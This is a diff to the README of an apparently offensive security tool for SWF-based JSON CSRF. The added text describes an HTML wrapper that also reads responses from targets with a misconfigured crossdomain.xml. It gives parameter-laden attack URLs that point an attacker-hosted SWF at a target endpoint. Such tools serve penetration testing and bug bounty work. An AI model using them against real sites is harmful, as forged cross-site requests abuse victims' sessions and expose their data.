@@ -1,5 +1,5 @@
 ## Purpose
-This repository was created to simplify the SWF-based JSON CSRF exploitation. It should work also with XML data using optional parameters.
+This repository was created to simplify the SWF-based JSON CSRF exploitation. It should work also with XML (and any other) data using optional parameters. Also it can be used for easy exploitation of crossdomain.xml misconfiguration (no need to compile .swf for each case).
 
 ## Instructions
 The .swf file take 3 required and 2 optional parameters:
@@ -20,6 +20,9 @@ http[s]://[yourhost-and-path]/test.swf?jsonData=[yourJSON]&php_url=http[s]://[yo
 e.g.
 https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
 
+Using HTML wrapper (read.html), parameters are same:
+https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
+In case your target has crossdomain.xml misconfigured, or allowing your domain, you will also get the response using this wrapper. In this case you can use wrapper without 307 redirect (no need of `php_url` parameter).
 
 If you have the questions regarding this repository - ping me in the Twitter: [@h1_sp1d3r](https://twitter.com/h1_sp1d3r)
 
